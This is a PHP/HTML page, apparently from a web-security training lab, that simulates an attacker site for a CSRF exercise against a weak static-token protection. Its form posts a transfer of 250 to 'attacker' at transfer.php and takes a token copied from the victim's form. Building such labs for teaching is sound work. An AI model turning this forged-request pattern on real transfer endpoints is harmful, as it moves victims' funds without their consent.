<?php
$base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http')
  . '://' . $_SERVER['HTTP_HOST'];
?>
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Attacker</title>
  <style>
    body {
      font-family: system-ui;
      background: #0B0F14;
      color: #F2F4F8;
      padding: 30px;
    }
    .card {
      max-width: 720px;
      margin: auto;
      background: #141B26;
      padding: 24px;
      border: 1px solid #1F2937;
      border-radius: 12px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0 14px 0;
      border-radius: 10px;
      border: 1px solid #1F2937;
      background: #0F1A2B;
      color: #F2F4F8;
      box-sizing: border-box;
    }
    .btn {
      display: inline-block;
      background: #D41414;
      color: white;
      padding: 10px 14px;
      border-radius: 10px;
      text-decoration: none;
      border: none;
      cursor: pointer;
    }
    .btn:hover {
      background: #FF2A2A;
    }
    code {
      color: #1F6AFF;
    }
    .hint {
      color: #dc2626;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>CSRF PoC — Static Token</h2>
    <p>Cette page simule un site attaquant.</p>
    <p>L’objectif est d’exploiter une protection CSRF faible basée sur un token statique et prévisible.</p>
    <p class="hint">Étape attendue : inspecter le formulaire de la victime, récupérer le token CSRF, puis le réutiliser ici.</p>

    <form method="POST" action="<?= htmlspecialchars($base_url, ENT_QUOTES, 'UTF-8'); ?>/transfer.php">
      <label>Destinataire</label>
      <input type="text" name="to" value="attacker" readonly>

      <label>Montant</label>
      <input type="text" name="amount" value="250" readonly>

      <label>CSRF Token</label>
      <input type="text" name="csrf_token" placeholder="Collez ici le token récupéré">

      <button class="btn" type="submit">Launch CSRF Attack</button>
    </form>
  </div>
</body>
</html>